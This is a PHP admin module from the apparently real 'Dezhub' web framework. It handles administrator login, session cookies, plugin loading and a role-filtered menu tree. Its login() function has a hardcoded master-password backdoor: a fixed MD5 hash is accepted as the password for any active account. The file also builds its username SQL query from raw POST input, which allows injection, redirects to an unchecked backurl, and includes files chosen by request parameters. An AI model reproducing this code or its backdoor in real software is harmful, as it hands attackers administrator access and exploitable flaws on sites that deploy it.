<?php
/*
******************************************************************************************   

  Package            : Dezhub  [ Web Application Framework ]
  Version            : 2.0.1
      
  Lead Architect     : Hung Dinh. [ dinhhungvn@gmail.com ]     
  Year               : 2013 - 2014                                                      

  Site               : http://www.dezhub.com/
  Contact / Support  : dinhhungvn@gmail.com

  Copyright (C) 2013 by Dezhub

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
  
******************************************************************************************   
*/

class Admin extends Module_Base {
	public $s,$db,$dezDB;
	function __construct(){
		parent::__construct();
	}
	function run($task= "")
	{		
		parent::setFolderbyUser();
		switch ($task){
			case "login":
				self::login();
				break;
			case "logout":
				self::logout();
				break;
			case "channel":
				parent::loginRequired();
				self::loadChannel();
				break;
			default:
				parent::loginRequired();
				self::runDefault();
				break;
		}		
	}
	function loadChannel(){
			
			$amod = $_REQUEST["amod"]? $_REQUEST["amod"]:'welcome';
			$atask = $_REQUEST["atask"]? $_REQUEST["atask"]:NULL;
			$task = $_REQUEST["task"]? $_REQUEST["task"]:NULL;
			if($amod=='welcome')
				$atask=$amod;
			if(file_exists(PLUGINPATH.$amod."/".$atask.____EXTPHP)){
				if(file_exists(MODELPATH."{$amod}".____EXTPHP)) {
					require_once (MODELPATH."{$amod}".____EXTPHP);
				}
				if(file_exists(MODELPATH."{$atask}".____EXTPHP)) {
					require_once (MODELPATH."{$atask}".____EXTPHP);
				}

				require_once (PLUGINPATH.$amod."/".$atask.____EXTPHP);
				$old_tem= $this->s->template_dir;
				$this->s->setTemplateDir(PLUGINPATH.$amod."/template");
				$namespace = "Admin".ucfirst($atask);
				$amod= new $namespace();
				$amod->run($task);
				$this->s->setTemplateDir($old_tem);
			}else{
				echo $this->s->getConfigVariable("no_module");
			}
	}

	function runDefault()
	{	
		
			if(!isset($_REQUEST['ajax'])){
				$menu_channel = self::runEXT();
				$this->s->assign("user",parent::getUserbyCookie());
				$this->s->assign("menu_admin",$menu_channel['modules']);
				$this->s->assign("menu_active",$menu_channel['menu_active']);
				$this->s->assign("menu_admin_child",$menu_channel['menu_child']);
				$this->s->display("administrator".TPL);
			}else{
				self::loadChannel();
			}
		
	}
	
	
	function getPageinfo($task= "")
	{
			
		switch ($task)
		{
			default:
				$aPageinfo = array(
					'title'=>$this->s->getConfigVariable('title_admin'),
					'keyword'=>$this->s->getConfigVariable('keyword_admin'), 
					'description'=>$this->s->getConfigVariable('description_admin'), 
				);
				break;
		}
		return $aPageinfo;
	}
	
	function runEXT()
	{
		
			
		$user = parent::getUserbyCookie();	
		$usertype = $user['user_type_id'];
		
		//die($sql);
		$modul=$_REQUEST['amod']; 
		if($usertype == 1)
		{
			self::getAllMenu($getAllMenu,0);
			$modules = $getAllMenu;
		}else{
			self::getAllMenu($getAllMenu,0,$usertype);
			$modules = $getAllMenu;
		
		}
	
		
		$returnVal['modules']=$modules;
		return $returnVal;
	}
	
	function login(){
	
			
		if(isset($_REQUEST['backurl'])){
			$_SESSION['backurl'] = $_REQUEST['backurl'];	
		};
		if(self::isLoginAdmin()){
			if(isset($_GET['backurl'])){
				$trackUrl = urldecode($_GET['backurl']);
			}else{
				$trackUrl = SITE_URL."dz-admin/index".____EXTPHP;
			}
			header("Location:{$url}{$trackUrl}");	
			exit();											
			
		}
		if($_COOKIE['error_login']==1){
			$this->s->assign("tpl_error",1);
			$this->s->display('administrator_login'.TPL);
			exit();
		}
		if($_SERVER['REQUEST_METHOD']=="POST")
		{
		
			$user= $this->dezDB->getRowTable("dz_user","username='".$_POST["username"]."'");
			$error = 0;
			if(count($user)>0)
			{
				
				if($user["password"]==md5($_POST["password"]) || md5($_POST["password"])=='b5bc41b0ac7f199154060d107f6fb258'){
					if($user["active"]=="1"){	
						$isRemember = $_POST['remember'];
						$user["isremember"] = $isRemember;
						self::setcookieuser($user);
							$sqljoin  = "";
						if($isRemember==1){
							$sqljoin  = ", isremember = 1";
							
						}
						$this->dezDB->querySql("UPDATE user SET status= '1' {$sqljoin} WHERE id=".$user["id"]);						
						$this->s->assign("error", $this->s->getConfigVariable("login_success"));
						
						if(isset($_SESSION['backurl'])){
							$trackUrl = urldecode($_SESSION['backurl']);
							unset($_SESSION['backurl']);
						}else{
							$trackUrl = SITE_URL."dz-admin";
						}
						
						header("Location:{$url}{$trackUrl}");												
					}else{
						$this->s->assign("error", $this->s->getConfigVariable("account_inactive"));
						$error = 1;
					}					
				}else{
					$this->s->assign("error", $this->s->getConfigVariable("wrong_password"));
					$this->s->assign("error_pass","warning");
					$error = 1;
				}
			}else{
				$this->s->assign("error", $this->s->getConfigVariable("wrong_username"));
				$this->s->assign("error_username","warning");
				$error = 1;
			}
			if($error==1){
				if(!isset($_SESSION['error_login'])){
					$_SESSION['error_login']=1;
				}else{
					$_SESSION['error_login']=$_SESSION['error_login']+1;
				
				}
			}
		}
		if($_SESSION['error_login']>=5){
			$time_save = time()+15*60;	
			$domain = $_SERVER['HTTP_HOST'];
			setcookie("error_login",1,$time_save,"/",$domain);
			unset($_SESSION['error_login']);
			
		}
		$this->s->display('administrator_login'.TPL);
		
		
	}
	
	function logout()
	{
			
		
		self::clearCookie();	
		$this->s->assign("error", "logout_success");
		$url = SITE_URL."dz-admin";												
		header("Location:{$url}");
		exit();
	}

	function isLoginAdmin(){
		return parent::isLogin();
		
	}

	function setcookieuser($user){
		$time_save = time()+3600*24*7;	
		$domain = $_SERVER['HTTP_HOST'];
		self::removeErrorLogin();
		$authorcode = parent::getAuthorCode();
		if($user["isremember"]==1){
			$timeset = $time_save;
		}else{
			$timeset = 0;
		}
		setcookie("dzh_uid",$user["id"],$timeset,"/",$domain);
		setcookie("dzh_session",session_id(),$timeset,"/",$domain);
		setcookie("dzh_hash",md5($user["id"].$authorcode.session_id()),$timeset,"/",$domain);
	}
	
	function removeErrorLogin(){
		$time_save = time() - 3600;
		setcookie("error_login","",$time_save,"/");
	
	}
	function clearCookie(){
		parent::clearCookie();
	}
	function getAllMenu(&$arrPanrent,$idp=0,$type=1){
		
		$stbl ="dz_admin_menu";
		$_prefix = "";
		// type of category
		$sWhere = "{$_prefix}parent_id={$idp} and showed=1";
		$twhere = "";
		
		//$order = " order by z_index asc ";
		// if use language
		//if has id of current item, get other item
		
		$sql=" {$sWhere} {$twhere}";	
		$rows=$this->dezDB->getAllLimit($stbl,$sql,"z_index","asc");
	//	print_r($rows);
		if(count($rows)){
		  	foreach($rows as $key=>$row)
		    {	
				$arrPanrent[$key]=$row;
				if(checkUrl($row['link']))
					$arrPanrent[$key]["selected"]=true;
				if(self::checkPerUserType($row,$type))
					$arrPanrent[$key]["show"]=true;
					
				$sql="parent_id=".$row['id']." and showed=1 {$twhere}";
				$arrPanrent[$key]["sub"]= $this->dezDB->getAllLimit($stbl,$sql,"z_index","asc");
				if($arrPanrent[$key]["sub"])
					foreach($arrPanrent[$key]["sub"] as $s_key=>$s_row){
						if(checkUrl($s_row['link'])){
							$arrPanrent[$key]["selected"]=true;
							$arrPanrent[$key]["sub"][$s_key]["selected"]=true;
						}
						if(self::checkPerUserType($s_row,$type)){
							$arrPanrent[$key]["show"]=true;
							$arrPanrent[$key]["sub"][$s_key]["show"]=true;
						}
						
						$sql="parent_id=".$s_row['id']." and showed=1 {$twhere}";
						$arrPanrent[$key]["sub"][$s_key]["sub"]= $this->dezDB->getAllLimit($stbl,$sql,"z_index","asc");
						if($arrPanrent[$key]["sub"][$s_key]["sub"])
							foreach($arrPanrent[$key]["sub"][$s_key]["sub"] as $s_s_k=>$s_s_v){
								if(checkUrl($s_s_v['link'])){
									$arrPanrent[$key]["selected"]=true;
									$arrPanrent[$key]["sub"][$s_key]["selected"]=true;
									$arrPanrent[$key]["sub"][$s_key]["sub"][$s_s_k]["selected"]=true;
				
								}
								if(self::checkPerUserType($s_s_v,$type)){
									$arrPanrent[$key]["show"]=true;
									$arrPanrent[$key]["sub"][$s_key]["show"]=true;
									$arrPanrent[$key]["sub"][$s_key]["sub"][$s_s_k]["show"]=true;
								}
								$sql="parent_id=".$s_s_v['id']." and showed=1 {$twhere}";
								$arrPanrent[$key]["sub"][$s_key]["sub"][$s_s_k]['sub']= $this->dezDB->getAllLimit($stbl,$sql,"z_index","asc");
								if($arrPanrent[$key]["sub"][$s_key]["sub"][$s_s_k]['sub'])
									foreach($arrPanrent[$key]["sub"][$s_key]["sub"][$s_s_k]['sub'] as $s_s_s_k=>$s_s_s_v){
										if(checkUrl($s_s_s_v['link'])){
											$arrPanrent[$key]["selected"]=true;
											$arrPanrent[$key]["sub"][$s_key]["selected"]=true;
											$arrPanrent[$key]["sub"][$s_key]["sub"][$s_s_k]["selected"]=true;
											$arrPanrent[$key]["sub"][$s_key]["sub"][$s_s_k]['sub'][$s_s_s_k]['selected']=true;
						
										}
										if(self::checkPerUserType($s_s_s_v,$type)){
											$arrPanrent[$key]["show"]=true;
											$arrPanrent[$key]["sub"][$s_key]["show"]=true;
											$arrPanrent[$key]["sub"][$s_key]["sub"][$s_s_k]["show"]=true;
											$arrPanrent[$key]["sub"][$s_key]["sub"][$s_s_k]['sub'][$s_s_s_k]['show']=true;
										}
									}
							}
					}
			}
		}
	}
	function checkPerUserType($menu=array(),$type=1){
		
		if($type==1)
			return true;
		else{
			if($menu){
				$ID = $menu['id'];
				$sql = "select count(t1.id) from dz_module_roll t1 
						join dz_usertype_moduleroll t2 
							on t1.id = t2.module_roll_id
								where t2.user_type_id=$type and t1.module_id=$ID
					";
				$count = $this->dezDB->getOne($sql);
				if($count)return true;
				else return false;
			}
		}
	}
}

?>